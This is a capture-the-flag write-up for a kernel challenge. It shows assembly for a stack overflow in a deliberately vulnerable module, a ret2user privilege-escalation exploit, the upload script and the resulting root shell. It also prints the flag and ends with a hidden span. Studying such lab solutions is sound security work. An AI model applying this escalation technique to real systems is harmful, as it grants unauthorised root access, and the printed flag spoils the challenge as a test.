---
title: "Pwn - cyKer"
date: 2026-05-10T22:54:00+03:00
tags: ["Pwn", "kernel", "CyCTF-Luxor"]
categories: ["Machines&Challenges"]
difficulty: "None"
author: "z3r0s"
---

# cyKer — Kernel Exploitation Writeup

**Category:** Pwn / Kernel
**Flag:** `CyCTF{3c03ee481e3c39c175d1a8baed7f9bbe}`

---

## Overview

We are given a QEMU-based kernel challenge containing:

- `bzImage` — Linux 5.4.0 kernel
- `initramfs.cpio.gz` — root filesystem with a vulnerable kernel module `hackme.ko`
- `run.sh` — QEMU launch script with **all mitigations disabled**:
  ```
  nokaslr nosmep nosmap mitigations=off
  ```

The VM boots, loads `hackme.ko`, then drops us into a shell as **uid 1000**. The flag at `/flag` is owned by root with `chmod 600`.

**Goal:** Escalate to root and read `/flag`.

---

## 1. Reversing hackme.ko

Extracted from the initramfs and analyzed with `readelf`/`objdump`. The module creates `/proc/knote` with read/write handlers.

### Key functions

| Function | Purpose |
|---|---|
| `knote_init` | Creates `/proc/knote` with `fops` |
| `knote_write` | Copies user data into a **64-byte stack buffer** via `do_copy` |
| `knote_read` | Reads from a global `note_storage` buffer back to user |
| `do_copy` | Simple byte-by-byte `memcpy` |

### The vulnerability — Stack Buffer Overflow in `knote_write`

```
knote_write:
  push %r12
  push %rbp
  push %rbx
  sub  $0x40, %rsp          ; 64-byte local buffer on the stack

  ; ... validates count <= 0x1000 (4096) ...
  ; ... kmalloc(count) → kbuf ...
  ; ... copy_from_user(kbuf, user_buf, count) ...

  mov  %rbx, %rdx           ; rdx = count (up to 4096!)
  mov  %rbp, %rsi           ; rsi = kbuf
  mov  %rsp, %rdi           ; rdi = stack_buf (only 64 bytes!)
  call do_copy              ; OVERFLOW: copies count bytes into 64-byte buffer

  ; ... copies min(count, 64) bytes to global note_storage ...
  ; ... kfree(kbuf) ...

  add  $0x40, %rsp
  pop  %rbx                 ; ← overwritten by us
  pop  %rbp                 ; ← overwritten by us
  pop  %r12                 ; ← overwritten by us
  ret                       ; ← hijacked return address
```

The `do_copy` call copies **up to 4096 bytes** from the heap buffer into a **64-byte stack buffer** — a textbook stack overflow. Crucially, the saved registers and return address sit right above the buffer:

```
Offset from rsp:
  0x00 – 0x3F : 64-byte local buffer
  0x40         : saved rbx
  0x48         : saved rbp
  0x50         : saved r12
  0x58         : return address  ← we overwrite this
```

---

## 2. Finding Kernel Symbols

The kernel is **stripped** (no symbol table), but `__ksymtab` entries are still present. Each entry uses **relative s32 offsets**:

```c
struct kernel_symbol {
    s32 value_offset;   // function_addr = &value_offset + value_offset
    s32 name_offset;    // string_addr   = &name_offset  + name_offset
};
```

Found the raw strings `"prepare_kernel_cred\0"` and `"commit_creds\0"` in `__ksymtab_strings`, computed their virtual addresses from the ELF LOAD segments, then scanned `__ksymtab` for entries whose `name_offset` resolves to those strings.

**Results:**

| Symbol | Address |
|---|---|
| `commit_creds` | `0xffffffff810892c0` |
| `prepare_kernel_cred` | `0xffffffff810895e0` |

---

## 3. Exploitation — ret2user

With **SMEP, SMAP, and KASLR all disabled**, the classic ret2user technique works: overwrite the kernel return address with a pointer to **userspace code** that runs in ring-0 context.

### Exploit flow

```
  ┌─────────────────────────────────────┐
  │  Userspace                          │
  │                                     │
  │  1. Save cs, ss, rflags, rsp        │
  │  2. open("/proc/knote", O_RDWR)     │
  │  3. write(fd, payload, 0x60)        │
  │     └─ overflow → ret to escalate() │
  └──────────────┬──────────────────────┘
                 │  (kernel hijacked)
  ┌──────────────▼──────────────────────┐
  │  escalate() — runs in ring-0        │
  │                                     │
  │  4. prepare_kernel_cred(0)          │
  │  5. commit_creds(result)            │
  │  6. swapgs                          │
  │  7. iretq → get_root_shell()        │
  └──────────────┬──────────────────────┘
                 │  (back to ring-3 as root)
  ┌──────────────▼──────────────────────┐
  │  get_root_shell()                   │
  │                                     │
  │  8. execve("/bin/sh") → root shell  │
  │  9. cat /flag                       │
  └─────────────────────────────────────┘
```

### Payload layout (0x60 = 96 bytes)

```
 [0x00 - 0x3F]  padding (zeros)
 [0x40 - 0x47]  rbx = 0
 [0x48 - 0x4F]  rbp = 0
 [0x50 - 0x57]  r12 = 0
 [0x58 - 0x5F]  return address = &escalate   ← hijack
```

### The exploit binary (`exploit_tiny.S`)

Written in pure x86-64 assembly, statically linked, **8.5 KB** total — small enough to gzip + base64 and transfer in a single shell session (592 chars).

```asm
escalate:
    xor %rdi, %rdi
    movabs $0xffffffff810895e0, %rax    ; prepare_kernel_cred
    call *%rax
    mov %rax, %rdi
    movabs $0xffffffff810892c0, %rax    ; commit_creds
    call *%rax
    swapgs
    ; push SS, RSP, RFLAGS, CS, RIP for iretq
    push user_ss
    push user_sp
    push user_rflags
    push user_cs
    push $get_root_shell
    iretq

get_root_shell:
    execve("/bin/sh", argv, NULL)
```

---

## 4. Delivery

The QEMU VM has a minimal BusyBox userland with no `wget`/`curl`. The exploit binary is transferred by:

1. `gzip` + `base64` encode locally (592 chars)
2. Echo in 64-char chunks appended to a file on the remote
3. `base64 -d | gunzip` to reconstruct the binary
4. `chmod +x` and execute

```python
# solver.py uploads and runs the exploit
cmd("> /dev/shm/e.b64")
for i in range(0, len(payload), 64):
    cmd(f"echo -n '{payload[i:i+64]}'>>/dev/shm/e.b64")
cmd("base64 -d /dev/shm/e.b64 | gunzip > /dev/shm/exp")
cmd("chmod +x /dev/shm/exp")
cmd("/dev/shm/exp")
cmd("cat /flag")
```

---

## 5. Result

```
/ $ /dev/shm/exp
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0
/ # cat /flag
CyCTF{3c03ee481e3c39c175d1a8baed7f9bbe}
```

---

## Files

| File | Description |
|---|---|
| `solver.py` | Pwntools script — connects, uploads, runs exploit, reads flag |
| `exploit_tiny.S` | Assembly source for the kernel exploit binary |
| `exploit_tiny` | Compiled static binary (8.5 KB) |


<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
